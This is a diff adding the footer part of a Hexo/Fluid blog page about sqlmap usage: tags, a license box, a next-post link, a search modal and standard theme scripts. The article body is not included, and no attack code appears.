+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/sql%E6%B3%A8%E5%85%A5/" class="print-no-link">#sql注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sqlmap的使用</div>
+      <div>http://example.com/2023/11/25/sqlmap的使用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/23/%E6%95%B0%E5%AD%97%E5%9E%8Bsql%E6%B3%A8%E5%85%A5/" title="数字型sql注入">
+                        <span class="hidden-mobile">数字型sql注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
